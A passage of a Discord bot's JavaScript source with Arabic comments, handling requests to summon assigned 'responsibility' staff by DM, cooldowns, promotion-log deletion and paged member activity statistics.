    if (interaction.isModalSubmit() && interaction.customId.startsWith('setup_reason_modal_')) {
      // منع التفاعلات المتكررة
      if (interaction.replied || interaction.deferred) {
        console.log('تم تجاهل تفاعل متكرر في نموذج السيتب');
        return;
      }

      const customIdParts = interaction.customId.replace('setup_reason_modal_', '').split('_');
      const responsibilityName = customIdParts[0];
      const target = customIdParts[1]; // This is the target user ID from the button click
      let reason = interaction.fields.getTextInputValue('reason').trim();

      // التعامل مع المنشن في النص
      if (reason.includes('<@')) {
        // استخراج المنشن وإزالة العلامات
        reason = reason.replace(/<@!?(\d+)>/g, (match, userId) => {
          try {
            return `<@${userId}>`;
          } catch (error) {
            return match;
          }
        });
      }

      // التعامل مع معرفات المستخدمين في النص
      const userIdPattern = /\b\d{17,19}\b/g;
      const foundIds = reason.match(userIdPattern);
      if (foundIds) {
        for (const id of foundIds) {
          try {
            await client.users.fetch(id);
            reason = reason.replace(new RegExp(`\\b${id}\\b`, 'g'), `<@${id}>`);
          } catch (error) {
            // ID غير صحيح، نتركه كما هو
          }
        }
      }

      if (!reason || reason.trim() === '') {
        reason = 'لا يوجد سبب محدد';
      }

      if (!responsibilities[responsibilityName]) {
        return interaction.reply({ content: '**المسؤولية غير موجودة!**', flags: 64 });
      }

      const responsibility = responsibilities[responsibilityName];
      const responsibles = responsibility.responsibles || [];

      if (responsibles.length === 0) {
        return interaction.reply({ content: '**لا يوجد مسؤولين معينين لهذه المسؤولية.**', flags: 64 });
      }

      // Check cooldown
      const cooldownTime = checkCooldown(interaction.user.id, responsibilityName);
      if (cooldownTime > 0) {
        return interaction.reply({
          content: `**لقد استخدمت هذا الأمر مؤخرًا. يرجى الانتظار ${Math.ceil(cooldownTime / 1000)} ثانية أخرى.**`,
          flags: 64
        });
      }

      // Start cooldown for user
      startCooldown(interaction.user.id, responsibilityName);

      // Get stored image URL for this user
      const storedImageUrl = client.setupImageData?.get(interaction.user.id);

      const embed = colorManager.createEmbed()
        .setTitle(`**طلب مساعدة في المسؤولية: ${responsibilityName}**`)
        .setDescription(`**السبب:** ${reason}\n**من:** ${interaction.user}`);

      // Add image if available
      if (storedImageUrl) {
        embed.setImage(storedImageUrl);
      }

      const claimButton = new ButtonBuilder()
        .setCustomId(`claim_task_${responsibilityName}_${Date.now()}_${interaction.user.id}`)
        .setLabel('claim')
.setEmoji('<:emoji_11:1448570670270251079>')
        .setStyle(ButtonStyle.Success);

      const buttonRow = new ActionRowBuilder().addComponents(claimButton);

      if (target === 'all') {
        // Send to all responsibles
        let sentCount = 0;
        for (const userId of responsibles) {
          try {
            const user = await client.users.fetch(userId);
            await user.send({ embeds: [embed], components: [buttonRow] });
            sentCount++;
          } catch (error) {
            console.error(`Failed to send DM to user ${userId}:`, error);
          }
        }

        // Start tracking this task for reminders
        const taskId = `${responsibilityName}_${Date.now()}`;
        const notificationsCommand = client.commands.get('notifications');
        if (notificationsCommand && notificationsCommand.trackTask) {
          notificationsCommand.trackTask(taskId, responsibilityName, responsibles, client);
        }

        await interaction.reply({ content: `**تم إرسال الطلب لـ ${sentCount} من المسؤولين.**`, flags: 64 });
      } else {
        // Send to specific user
        try {
          // التحقق من صحة معرف المستخدم المستهدف
          if (!/^\d{17,19}$/.test(target)) {
            return interaction.reply({ content: '**معرف المستخدم المستهدف غير صحيح.**', flags: 64 });
          }

          const user = await client.users.fetch(target);
          await user.send({ embeds: [embed], components: [buttonRow] });

          // Start tracking this task for reminders
          const taskId = `${responsibilityName}_${Date.now()}`;
          const notificationsCommand = client.commands.get('notifications');
          if (notificationsCommand && notificationsCommand.trackTask) {
            notificationsCommand.trackTask(taskId, responsibilityName, [target], client);
          }

          await interaction.reply({ content: `**تم إرسال الطلب إلى ${user.username}.**`, flags: 64 });
        } catch (error) {
          await interaction.reply({ content: '**فشل في إرسال الرسالة الخاصة أو المستخدم غير موجود.**', flags: 64 });
        }
      }

      // Log the task requested event
        logEvent(client, interaction.guild, {
            type: 'TASK_LOGS',
            title: 'Task Requested',
            description: `Responsibility: **${responsibilityName}**`,
            user: interaction.user,
            fields: [
                { name: 'Reason', value: reason, inline: false },
                { name: 'Target', value: target === 'all' ? 'All' : `<@${target}>`, inline: true }
            ]
        });
      return;
    }

    // Handle setup select menu interactions - معالج عام للسيتب يعمل مع جميع الرسائل
    if (interaction.isStringSelectMenu() && interaction.customId === 'setup_select_responsibility') {
      console.log(`🔄 معالجة اختيار المسؤولية من السيتب: ${interaction.values[0]} - Message ID: ${interaction.message.id}`);

      // التأكد من أن التفاعل لم يتم الرد عليه مسبقاً
      if (interaction.replied || interaction.deferred) {
        console.log('تم تجاهل تفاعل متكرر في منيو السيتب');
        return;
      }

      try {
        const selected = interaction.values[0];
        console.log(`✅ تم اختيار المسؤولية: ${selected}`);

        if (selected === 'no_responsibilities') {
          return interaction.reply({
            content: '**لا توجد مسؤوليات معرفة حتى الآن. يرجى إضافة مسؤوليات أولاً.**',
            flags: 64
          });
        }

        // التأكد من أن الرسالة التي تم الرد عليها هي رسالة الإعدادات
        if (!interaction.message.content.includes('Select a responsibility')) {
          return interaction.reply({ content: '**هذا ليس تفاعل إعدادات صالح.**', flags: 64 });
        }

        // التحقق من أن المستخدم الذي تفاعل هو نفس المستخدم الذي استدعى أمر setup
        const setupCommand = client.commands.get('setup');
        if (setupCommand && setupCommand.setupInitiatorId !== interaction.user.id) {
          return interaction.reply({ content: '**ليس لديك الإذن لاستخدام هذا التفاعل.**', flags: 64 });
        }

        // قراءة المسؤوليات مباشرة من الملف
        const fs = require('fs');
        const path = require('path');
        const responsibilitiesPath = path.join(__dirname, 'data', 'responsibilities.json');

        let currentResponsibilities = {};
        try {
          const data = fs.readFileSync(responsibilitiesPath, 'utf8');
          currentResponsibilities = JSON.parse(data);
        } catch (error) {
          console.error('Failed to load responsibilities:', error);
          return interaction.reply({ content: '**خطأ في تحميل المسؤوليات!**', flags: 64 });
        }

        const responsibility = currentResponsibilities[selected];
        if (!responsibility) {
          return interaction.reply({ content: '**المسؤولية غير موجودة!**', flags: 64 });
        }

        const desc = responsibility.description && responsibility.description.toLowerCase() !== 'لا'
          ? responsibility.description
          : '**No desc**';

        // بناء أزرار المسؤولين
        const buttons = [];
        const responsiblesList = [];

        if (responsibility.responsibles && responsibility.responsibles.length > 0) {
          for (let i = 0; i < responsibility.responsibles.length; i++) {
            const userId = responsibility.responsibles[i];
            try {
              const guild = interaction.guild;
              const member = await guild.members.fetch(userId);
              const displayName = member.displayName || member.user.username;
              responsiblesList.push(`${i + 1}. ${displayName}`);
              buttons.push(
                new ButtonBuilder()
                  .setCustomId(`setup_contact_${selected}_${userId}`)
                  .setLabel(`${i + 1}`)
                  .setStyle(ButtonStyle.Primary)
              );
            } catch (error) {
              console.error(`Failed to fetch member ${userId}:`, error);
              responsiblesList.push(`${i + 1}. User ${userId}`);
              buttons.push(
                new ButtonBuilder()
                  .setCustomId(`setup_contact_${selected}_${userId}`)
                  .setLabel(`${i + 1}`)
                  .setStyle(ButtonStyle.Primary)
              );
            }
          }
        }

        if (buttons.length > 0) {
          buttons.push(
            new ButtonBuilder()
              .setCustomId(`setup_contact_${selected}_all`)
              .setLabel('الكل')
              .setStyle(ButtonStyle.Success)
          );
        }

        if (buttons.length === 0) {
          return interaction.reply({
            content: `**المسؤولية:** __${selected}__\n**الشرح:** *${desc}*\n**لا يوجد مسؤولين معينين لهذه المسؤولية!**`,
            flags: 64
          });
        }

        // إنشاء الإيمبد والأزرار
        const responseEmbed = colorManager.createEmbed()
          .setTitle(`استدعاء مسؤولي: ${selected}`)
          .setDescription(`**الشرح:** *${desc}*\n\n**المسؤولين المتاحين:**\n*${responsiblesList.join('\n')}*\n\n**اختر من تريد استدعائه:**`)
          .setThumbnail('https://cdn.discordapp.com/emojis/1303973825591115846.png?v=1');

        const actionRows = [];
        for (let i = 0; i < buttons.length; i += 5) {
          actionRows.push(new ActionRowBuilder().addComponents(buttons.slice(i, i + 5)));
        }

        await interaction.reply({
          embeds: [responseEmbed],
          components: actionRows,
          flags: 64
        });

        // إنشاء collector للأزرار - persistent
        const buttonCollector = interaction.channel.createMessageComponentCollector({
          filter: i => i.customId.startsWith('setup_contact_') && i.user.id === interaction.user.id
        });

        buttonCollector.on('collect', async buttonInteraction => {
          try {
            if (buttonInteraction.replied || buttonInteraction.deferred) {
              return;
            }

            const parts = buttonInteraction.customId.split('_');
            if (parts.length < 4) {
              return;
            }

            const responsibilityName = parts[2];
            const userId = parts[3]; // Store the target user ID
            // Check cooldown
            const { checkCooldown } = require('./commands/cooldown.js');
            const cooldownTime = checkCooldown(buttonInteraction.user.id, responsibilityName);
            if (cooldownTime > 0) {
              return buttonInteraction.reply({
                content: `**لقد استخدمت هذا الأمر مؤخرًا. يرجى الانتظار ${Math.ceil(cooldownTime / 1000)} ثانية أخرى.**`,
                flags: 64
              });
            }

            // إظهار نموذج السبب
            const modal = new ModalBuilder()
              .setCustomId(`setup_reason_modal_${responsibilityName}_${userId}_${Date.now()}`) // Include target user ID in customId
              .setTitle('call reason');

            const reasonInput = new TextInputBuilder()
              .setCustomId('reason')
              .setLabel('Reason')
              .setStyle(TextInputStyle.Paragraph)
              .setRequired(true)
              .setPlaceholder('اكتب سبب الحاجة للمسؤول...')
              .setMaxLength(1000);

            const reasonRow = new ActionRowBuilder().addComponents(reasonInput);
            modal.addComponents(reasonRow);

            await buttonInteraction.showModal(modal);

          } catch (error) {
            console.error('Error in setup button collector:', error);
          }
        });

        // Set a timeout to delete the message after 10 minutes if no action is taken
        const deleteTimeout = setTimeout(async () => {
          try {
            await interaction.deleteReply().catch(() => {});
            console.log('تم حذف رسالة الاستدعاء بعد انتهاء الوقت المحدد من المعالج العام');

            // Try to update all setup menus
            try {
              const setupCommand = client.commands.get('setup');
              if (setupCommand && setupCommand.updateAllSetupMenus) {
                setupCommand.updateAllSetupMenus(client);
                console.log('تم تحديث جميع منيو السيتب من المعالج العام');
              }
            } catch (error) {
              console.error('خطأ في تحديث منيو السيتب من المعالج العام:', error);
            }
          } catch (error) {
            console.error('خطأ في حذف رسالة الاستدعاء من المعالج العام:', error);
          }
        }, 10 * 60 * 1000); // 10 دقائق

        buttonCollector.on('collect', async (buttonInteraction) => {
          // Clear the delete timeout when any button is clicked
          clearTimeout(deleteTimeout);
        });

        buttonCollector.on('end', async (collected, reason) => {
          try {
            console.log(`Button collector ended in global handler: ${reason}`);

            // Clear the timeout
            clearTimeout(deleteTimeout);

            // Only delete message if collector ended due to timeout or manual stop
            if (reason === 'time' || reason === 'manual') {
              try {
                await interaction.deleteReply().catch(() => {});
                console.log('تم حذف رسالة الاستدعاء من المعالج العام');
              } catch (error) {
                console.error('خطأ في حذف رسالة الاستدعاء من المعالج العام:', error);
              }

              // Try to update all setup menus
              try {
                const setupCommand = client.commands.get('setup');
                if (setupCommand && setupCommand.updateAllSetupMenus) {
                  setupCommand.updateAllSetupMenus(client);
                  console.log('تم تحديث جميع منيو السيتب من المعالج العام');
                }
              } catch (error) {
                console.error('خطأ في تحديث منيو السيتب من المعالج العام:', error);
              }
            }
          } catch (error) {
            console.error('خطأ في إنهاء button collector في المعالج العام:', error);
          }
        });

      } catch (error) {
        console.error('Error in setup select menu:', error);
        try {
          await interaction.reply({
            content: '**حدث خطأ أثناء معالجة الطلب.**',
            flags: 64
          });
        } catch (replyError) {
          console.error('Failed to send error reply:', replyError);
        }
      }
      return;
    }

    // Handle button clicks for setup contacts - الآن يعمل مع جميع الرسائل
    if (interaction.isButton() && interaction.customId.startsWith('setup_contact_')) {
      console.log(`🔘 معالجة زر الاتصال: ${interaction.customId}`);

      // التأكد من أن التفاعل لم يتم الرد عليه مسبقاً
      if (interaction.replied || interaction.deferred) {
        console.log('تم تجاهل تفاعل متكرر في أزرار السيتب');
        return;
      }

      // هذا الزر تم معالجته بالفعل في معالج select menu أعلاه
      // لا نحتاج معالجة إضافية هنا
      return;
    }

  } catch (error) {
    // تسجيل أي خطأ للتشخيص
    console.error(`[CATCH] خطأ في معالج التفاعلات: ${error.message}`);
    const customId = interaction?.customId || 'unknown';
    if (interaction && interaction.customId) {
      console.error(`[CATCH] customId: ${customId}`);
    }

    // قائمة الأخطاء المتجاهلة الموسعة
    const ignoredErrorCodes = [
      10008, // Unknown Message
      40060, // Interaction has already been acknowledged
      10062, // Unknown interaction
      10003, // Unknown channel
      50013, // Missing permissions
      50001, // Missing access
      50027, // Invalid webhook token
      10015, // Unknown webhook
      50035, // Invalid form body
      10014, // Unknown emoji
      10020, // Unknown user
      40061, // Interaction already replied
      50021, // Cannot edit a message that was not sent by the bot
      50025, // Invalid OAuth state
      30001, // Maximum number of guilds reached
      30003, // Maximum number of friends reached
      30005, // Maximum number of reactions reached
      30010, // Maximum number of channels reached
      50034  // You can only bulk delete messages that are under 14 days old
    ];

    // تجاهل أخطاء Discord المعروفة
    if (error.code && ignoredErrorCodes.includes(error.code)) {
      console.log(`تم تجاهل خطأ Discord المعروف: ${error.code}`);
      return;
    }

    // تجاهل رسائل الأخطاء المعروفة
    if (error.message && (
      error.message.includes('Unknown interaction') ||
      error.message.includes('Already replied') ||
      error.message.includes('Reply timeout') ||
      error.message.includes('Invalid Form Body') ||
      error.message.includes('Cannot read properties of undefined') ||
      error.message.includes('Unknown Message') ||
      error.message.includes('Unknown channel')
    )) {
      console.log(`تم تجاهل خطأ معروف: ${error.message.substring(0, 50)}...`);
      return;
    }

    // تجاهل التفاعلات القديمة
    if (interaction && interaction.createdTimestamp) {
      const interactionAge = Date.now() - interaction.createdTimestamp;
      if (interactionAge > 12 * 60 * 1000) { // 12 دقيقة
        console.log('تم تجاهل تفاعل قديم');
        return;
      }
    }

    // تسجيل الأخطاء المهمة فقط مع تفاصيل أقل
    if (error.code && !ignoredErrorCodes.includes(error.code)) {
      console.error(`خطأ مهم في التفاعل - كود: ${error.code}, رسالة: ${error.message?.substring(0, 100)}`);
    }
  }
});

// دالة لعرض مسؤوليات المستخدم
async function showUserResponsibilities(message, targetUser, responsibilities, client) {
    // البحث عن مسؤوليات المستخدم
    const userResponsibilities = [];

    for (const [respName, respData] of Object.entries(responsibilities)) {
        if (respData.responsibles && respData.responsibles.includes(targetUser.id)) {
            // حساب عدد المسؤولين الآخرين (غير المستخدم الحالي)
            const otherResponsibles = respData.responsibles.filter(id => id !== targetUser.id);
            userResponsibilities.push({
                name: respName,
                otherResponsiblesCount: otherResponsibles.length
            });
        }
    }

    // إنشاء الرد
    if (userResponsibilities.length === 0) {
        const noRespEmbed = colorManager.createEmbed()
            .setDescription(`**${targetUser.username} ليس لديك أي مسؤوليات**`)
            .setColor('#000000')
            .setThumbnail('https://cdn.discordapp.com/attachments/1373799493111386243/1400390144795738175/download__2_-removebg-preview.png?ex=688d1f34&is=688bcdb4&hm=40da8d91a92062c95eb9d48f307697ec0010860aca64dd3f8c3c045f3c2aa13a&');

        await message.channel.send({ embeds: [noRespEmbed] });
    } else {
        // إنشاء قائمة المسؤوليات
        let responsibilitiesList = '';
        userResponsibilities.forEach((resp, index) => {
            responsibilitiesList += `**${index + 1}.** ${resp.name}\n${resp.otherResponsiblesCount} مسؤولون غيرك\n\n`;
        });

        const respEmbed = colorManager.createEmbed()
            .setTitle(`مسؤولياتك`)
            .setDescription(`**مسؤولياتك هي:**\n\n${responsibilitiesList}`)
            .setColor('#00ff00')
            .setThumbnail(targetUser.displayAvatarURL({ dynamic: true }))
            .addFields([
                { name: 'Total Res', value: `${userResponsibilities.length}`, inline: true },
                { name: 'User', value: `<@${targetUser.id}>`, inline: true }
            ])
            .setFooter({ text: 'By Ahmed.' })
            .setTimestamp();

        await message.channel.send({ embeds: [respEmbed] });
    }
}

// دالة لعرض إحصائيات المترقين مع التنقل
// Handle single record deletion
async function handleDeleteSingleRecord(interaction, roleId, recordIndex) {
    try {
        const promoteLogsPath = path.join(__dirname, 'data', 'promoteLogs.json');

        // Check permissions
        if (!BOT_OWNERS.includes(interaction.user.id)) {
            await interaction.reply({
                content: '❌ **ليس لديك صلاحية لحذف السجلات!**',
                flags: MessageFlags.Ephemeral
            });
            return;
        }

        // Read current logs
        const logs = readJSONFile(promoteLogsPath, []);

        // Filter logs for this role
        const roleRecords = logs.filter(log => {
            if (!log.data) return false;

            if (log.type === 'BULK_PROMOTION') {
                return log.data.targetRoleId === roleId || log.data.sourceRoleId === roleId;
            } else if (log.type === 'PROMOTION_APPLIED' || log.type === 'PROMOTION_ENDED') {
                return log.data.roleId === roleId || log.data.role?.id === roleId;
            } else if (log.type === 'MULTI_PROMOTION_APPLIED') {
                return log.data.roleIds && log.data.roleIds.includes(roleId);
            }

            return log.data.roleId === roleId;
        });

        if (recordIndex >= roleRecords.length) {
            await interaction.reply({
                content: '❌ **السجل غير موجود!**',
                flags: MessageFlags.Ephemeral
            });
            return;
        }

        const recordToDelete = roleRecords[recordIndex];

        // Find and remove the record from all logs
        const indexInAllLogs = logs.findIndex(log => 
            log.timestamp === recordToDelete.timestamp && 
            JSON.stringify(log.data) === JSON.stringify(recordToDelete.data)
        );

        if (indexInAllLogs === -1) {
            await interaction.reply({
                content: '❌ **لم يتم العثور على السجل في القائمة العامة!**',
                flags: MessageFlags.Ephemeral
            });
            return;
        }

        // Remove the record
        logs.splice(indexInAllLogs, 1);

        // Save updated logs
        writeJSONFile(promoteLogsPath, logs);

        const successEmbed = colorManager.createEmbed()
            .setTitle('✅ تم حذف السجل')
            .setDescription(`تم حذف السجل رقم ${recordIndex + 1} بنجاح`)
            .addFields([
                { name: '**تم الحذف بواسطة**', value: `<@${interaction.user.id}>`, inline: true },
                { name: '**التاريخ**', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true }
            ])
            .setTimestamp();

        await interaction.update({
            embeds: [successEmbed],
            components: []
        });

    } catch (error) {
        console.error('خطأ في حذف السجل:', error);
        await interaction.reply({
            content: '❌ **حدث خطأ أثناء حذف السجل!**',
            flags: MessageFlags.Ephemeral
        });
    }
}

// Handle all records deletion for a role
async function handleDeleteAllRecords(interaction, roleId) {
    try {
        const promoteLogsPath = path.join(__dirname, 'data', 'promoteLogs.json');

        // Check permissions
        if (!BOT_OWNERS.includes(interaction.user.id)) {
            await interaction.reply({
                content: '❌ **ليس لديك صلاحية لحذف السجلات!**',
                flags: MessageFlags.Ephemeral
            });
            return;
        }

        // Read current logs
        const logs = readJSONFile(promoteLogsPath, []);
        const originalCount = logs.length;

        // Filter out logs for this role
        const filteredLogs = logs.filter(log => {
            if (!log.data) return true;

            if (log.type === 'BULK_PROMOTION') {
                return !(log.data.targetRoleId === roleId || log.data.sourceRoleId === roleId);
            } else if (log.type === 'PROMOTION_APPLIED' || log.type === 'PROMOTION_ENDED') {
                return !(log.data.roleId === roleId || log.data.role?.id === roleId);
            } else if (log.type === 'MULTI_PROMOTION_APPLIED') {
                return !(log.data.roleIds && log.data.roleIds.includes(roleId));
            }

            return log.data.roleId !== roleId;
        });

        const deletedCount = originalCount - filteredLogs.length;

        if (deletedCount === 0) {
            await interaction.update({
                content: '⚠️ **لا توجد سجلات لحذفها لهذا الرول!**',
                embeds: [],
                components: []
            });
            return;
        }

        // Save updated logs
        writeJSONFile(promoteLogsPath, filteredLogs);

        const successEmbed = colorManager.createEmbed()
            .setTitle('✅ تم حذف جميع السجلات')
            .setDescription(`تم حذف ${deletedCount} سجل بنجاح`)
            .addFields([
                { name: '**الرول**', value: `<@&${roleId}>`, inline: true },
                { name: '**عدد السجلات المحذوفة**', value: `${deletedCount}`, inline: true },
                { name: '**تم الحذف بواسطة**', value: `<@${interaction.user.id}>`, inline: true },
                { name: '**التاريخ**', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true }
            ])
            .setTimestamp();

        await interaction.update({
            embeds: [successEmbed],
            components: []
        });

    } catch (error) {
        console.error('خطأ في حذف جميع السجلات:', error);
        await interaction.update({
            content: '❌ **حدث خطأ أثناء حذف السجلات!**',
            embeds: [],
            components: []
        });
    }
}

async function handleBulkPromotionStats(interaction, client) {
    const { getRealUserStats } = require('./utils/userStatsCollector');
    const { ButtonBuilder, ActionRowBuilder, ButtonStyle } = require('discord.js');

    // تهيئة المتغير إذا لم يكن موجوداً
    if (!client.bulkPromotionMembers) {
        client.bulkPromotionMembers = new Map();
    }

    // استخراج معرف البيانات والصفحة الحالية
    let currentPage = 0;
    let dataKey = interaction.customId;

    if (interaction.customId.includes('stats_nav_')) {
        const parts = interaction.customId.split('_');
        dataKey = parts.slice(3).join('_'); // كل شيء بعد stats_nav_
        currentPage = parseInt(parts[2]) || 0;
    }

    // البحث عن البيانات في جميع المفاتيح المحفوظة
    let membersData = null;
    let actualKey = null;

    for (const [key, data] of client.bulkPromotionMembers.entries()) {
        if (key === dataKey || key.includes(dataKey.split('_').slice(-1)[0])) {
            membersData = data;
            actualKey = key;
            break;
        }
    }

    if (!membersData) {
        return interaction.reply({
            content: 'لم يتم العثور على بيانات الأعضاء المترقين أو انتهت صلاحيتها.',
            flags: MessageFlags.Ephemeral
        });
    }

    // التحقق من صلاحية البيانات (24 ساعة)
    const dataAge = Date.now() - membersData.timestamp;
    if (dataAge > 24 * 60 * 60 * 1000) {
        client.bulkPromotionMembers.delete(actualKey);
        return interaction.reply({
            content: 'انتهت صلاحية بيانات الأعضاء المترقين (24 ساعة).',
            flags: MessageFlags.Ephemeral
        });
    }

    try {
        await interaction.deferReply({ flags: MessageFlags.Ephemeral });

        // جمع إحصائيات جميع الأعضاء المترقين
        const membersWithStats = [];

        for (const member of membersData.successfulMembers) {
            const memberObj = typeof member === 'object' ? member : { id: member, displayName: null };

            try {
                // الحصول على كائن العضو من السيرفر
                const guildMember = await interaction.guild.members.fetch(memberObj.id).catch(() => null);

                if (guildMember) {
                    // جمع الإحصائيات للعضو
                    const stats = await getRealUserStats(memberObj.id);

                    membersWithStats.push({
                        id: memberObj.id,
                        displayName: guildMember.displayName || guildMember.user.username,
                        username: guildMember.user.username,
                        stats: stats
                    });
                }
            } catch (error) {
                console.error(`خطأ في جمع إحصائيات العضو ${memberObj.id}:`, error);
            }
        }

        // ترتيب الأعضاء حسب الوقت الصوتي (الأكثر نشاطاً أولاً)
        membersWithStats.sort((a, b) => (b.stats.voiceTime || 0) - (a.stats.voiceTime || 0));

        // إعداد التنقل
        const membersPerPage = 10;
        const totalPages = Math.ceil(membersWithStats.length / membersPerPage);
        currentPage = Math.max(0, Math.min(currentPage, totalPages - 1));

        const startIndex = currentPage * membersPerPage;
        const endIndex = Math.min(startIndex + membersPerPage, membersWithStats.length);
        const currentMembers = membersWithStats.slice(startIndex, endIndex);

        // محاولة الحصول على أسماء الرولات
        let sourceRoleName = 'الرول المصدر';
        let targetRoleName = 'الرول المستهدف';

        try {
            if (membersData.sourceRoleId) {
                const sourceRole = await interaction.guild.roles.fetch(membersData.sourceRoleId);
                if (sourceRole) sourceRoleName = sourceRole.name;
            }
            if (membersData.targetRoleId) {
                const targetRole = await interaction.guild.roles.fetch(membersData.targetRoleId);
                if (targetRole) targetRoleName = targetRole.name;
            }
        } catch (roleError) {
            console.log('خطأ في جلب أسماء الرولات:', roleError);
        }

        // إنشاء الإمبد
        const statsEmbed = colorManager.createEmbed()
            .setTitle('احصائيات المترقين - ترقية جماعية')
            .setDescription(`من: ${sourceRoleName}\nإلى: ${targetRoleName}\nبواسطة: <@${membersData.moderator}>\nالسبب: ${membersData.reason || 'لم يتم تحديد سبب'}`)
            .setFooter({ 
                text: `الصفحة ${currentPage + 1} من ${totalPages} | إجمالي الأعضاء: ${membersWithStats.length}` 
            })
            .setTimestamp();

        // إضافة إحصائيات كل عضو كحقول منفصلة
        for (let i = 0; i < currentMembers.length; i++) {
            const member = currentMembers[i];
            const stats = member.stats;

            // تنسيق الوقت الصوتي
            const voiceTimeFormatted = formatDuration(stats.voiceTime || 0);

            const statsValue = `الوقت الصوتي: ${voiceTimeFormatted}\nالانضمامات: ${stats.joinedChannels || 0}\nالرسائل: ${stats.messages || 0}\nالتفاعلات: ${stats.reactionsGiven || 0}`;

            statsEmbed.addFields([{
                name: `${startIndex + i + 1}. ${member.displayName}`,
                value: statsValue,
                inline: true
            }]);
        }

        // إنشاء أزرار التنقل
        const components = [];
        if (totalPages > 1) {
            const navigationRow = new ActionRowBuilder();

            // زر السابق
            const prevButton = new ButtonBuilder()
                .setCustomId(`stats_nav_${Math.max(0, currentPage - 1)}_${actualKey}`)
                .setLabel('السابق')
                .setStyle(ButtonStyle.Secondary)
                .setDisabled(currentPage === 0);

            // زر التالي
            const nextButton = new ButtonBuilder()
                .setCustomId(`stats_nav_${Math.min(totalPages - 1, currentPage + 1)}_${actualKey}`)
                .setLabel('التالي')
                .setStyle(ButtonStyle.Secondary)
                .setDisabled(currentPage === totalPages - 1);

            navigationRow.addComponents(prevButton, nextButton);
            components.push(navigationRow);
        }

        // إرسال الرد
        await interaction.editReply({
            embeds: [statsEmbed],
            components: components
        });

    } catch (error) {
        console.error('خطأ في عرض إحصائيات المترقين:', error);
        await interaction.editReply({
            content: 'حدث خطأ أثناء جمع الإحصائيات.',
            embeds: [],
            components: []
        });
    }
}

// دالة لتنسيق المدة الزمنية
function formatDuration(milliseconds) {
    if (!milliseconds || milliseconds <= 0) return 'لا يوجد';

    const totalSeconds = Math.floor(milliseconds / 1000);
    const totalMinutes = Math.floor(totalSeconds / 60);
    const totalHours = Math.floor(totalMinutes / 60);
    const days = Math.floor(totalHours / 24);

    const hours = totalHours % 24;
    const minutes = totalMinutes % 60;
    const seconds = totalSeconds % 60;

    const parts = [];
    if (days > 0) parts.push(`${days} يوم`);
    if (hours > 0) parts.push(`${hours} ساعة`);
    if (minutes > 0) parts.push(`${minutes} دقيقة`);
    if (seconds > 0 && days === 0) parts.push(`${seconds} ثانية`);

    return parts.length > 0 ? parts.join(' و ') : 'أقل من ثانية';
}

// Helper function for safe replies مع معالجة محسنة
async function safeReply(interaction, content, options = {}) {
  try {
    // Basic validation
    if (!interaction || !interaction.isRepliable()) {
      return false;
    }

    // Check interaction age with more strict timing
    const now = Date.now();
    const interactionAge = now - interaction.createdTimestamp;
    if (interactionAge > 600000) { // 10 دقائق فقط
      return false;
    }

    // Check if already replied or deferred
    if (interaction.replied || interaction.deferred) {
      return false;
    }

    const replyOptions = {
      content: content || 'حدث خطأ',
      flags: MessageFlags.Ephemeral,
      ...options
    };

    // محاولة الرد مع timeout
    const replyPromise = interaction.reply(replyOptions);
    const timeoutPromise = new Promise((_, reject) =>
      setTimeout(() => reject(new Error('Reply timeout')), 5000)
    );

    await Promise.race([replyPromise, timeoutPromise]);
    return true;
  } catch (error) {
    // تجاهل أخطاء Discord المعروفة بصمت تام
    const ignoredCodes = [10008, 40060, 10062, 10003, 50013, 50001, 50027, 10015, 50035, 10014, 10020, 40061];
    if (error.code && ignoredCodes.includes(error.code)) {
      return false;
    }

    // تجاهل رسائل الأخطاء المعروفة
    if (error.message && (
      error.message.includes('Unknown interaction') ||
      error.message.includes('Already replied') ||
      error.message.includes('Reply timeout') ||
      error.message.includes('Invalid Form Body')
    )) {
      return false;
    }

    return false;
  }
}

// معالج الإغلاق الآمن
async function gracefulShutdown(signal) {
    console.log(`\n🔄 جاري إيقاف البوت بأمان... (${signal})`);

    try {
        if (global.gc) {
            console.log('🧹 Triggering garbage collection...');
            global.gc();
        }
        saveData(true);
        client.destroy();
        process.exit(0);
    } catch (error) {
        process.exit(1);
    }
}

process.on('SIGINT', () => gracefulShutdown('SIGINT'));
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));

// معالج الأخطاء غير المعالجة
process.on('uncaughtException', (error) => {
  // تجاهل أخطاء Discord المعروفة
  const ignoredCodes = [10008, 40060, 10062, 10003, 50013, 50001, 50027, 10015, 50035, 10014, 10020, 40061];
  if (error.code && ignoredCodes.includes(error.code)) {
    console.log(`تم تجاهل خطأ Discord المعروف: ${error.code} - ${error.message}`);
    return;
  }

  // تجاهل رسائل الأخطاء المعروفة
  const ignoredMessages = [
    'Unknown interaction',
    'Unknown user',
    'already been acknowledged',
    'already replied',
    'Interaction has already been acknowledged',
    'Unknown Message',
    'Unknown channel'
  ];

  if (error.message && ignoredMessages.some(msg => error.message.includes(msg))) {
    console.log(`تم تجاهل خطأ معروف: ${error.message}`);
    return;
  }

  console.error('❌ خطأ غير معالج:', error);

  // حفظ البيانات بدون إيقاف البوت
  try {
    saveData();
    console.log('💾 تم حفظ البيانات بعد الخطأ');
  } catch (saveError) {
    console.error('❌ فشل في حفظ البيانات:', saveError);
  }

  // عدم إيقاف البوت للأخطاء البسيطة
  console.log('🔄 استمرار عمل البوت رغم الخطأ');
});

process.on('unhandledRejection', (reason, promise) => {
  // تجاهل أخطاء Discord المعروفة
  if (reason && reason.code) {
    const ignoredCodes = [10008, 40060, 10062, 10003, 50013, 50001, 50027, 10015, 50035, 10014, 10020, 40061];
    if (ignoredCodes.includes(reason.code)) {
      console.log(`تم تجاهل رفض Discord معروف: ${reason.code} - ${reason.message}`);
      return;
    }
  }

  // تجاهل رسائل الرفض المعروفة
  if (reason && reason.message) {
    const ignoredMessages = [
      'Unknown interaction',
      'Unknown user',
      'already been acknowledged',
      'already replied',
      'Interaction has already been acknowledged',
      'Unknown Message',
      'Unknown channel'
    ];

    if (ignoredMessages.some(msg => reason.message.includes(msg))) {
      console.log(`تم تجاهل رفض معروف: ${reason.message}`);
      return;
    }
  }

  console.error('❌ رفض غير معالج:', reason);

  // حفظ البيانات
  try {
    saveData();
  } catch (saveError) {
    console.error('❌ فشل في حفظ البيانات:', saveError);
  }
});

async function startBot() {
    await dbManager.initialize();
    
    const respPath = path.join(__dirname, 'data', 'responsibilities.json');
    if (fs.existsSync(respPath) && fs.statSync(respPath).size > 2) {
        try {
            const fileContent = fs.readFileSync(respPath, 'utf8').trim();
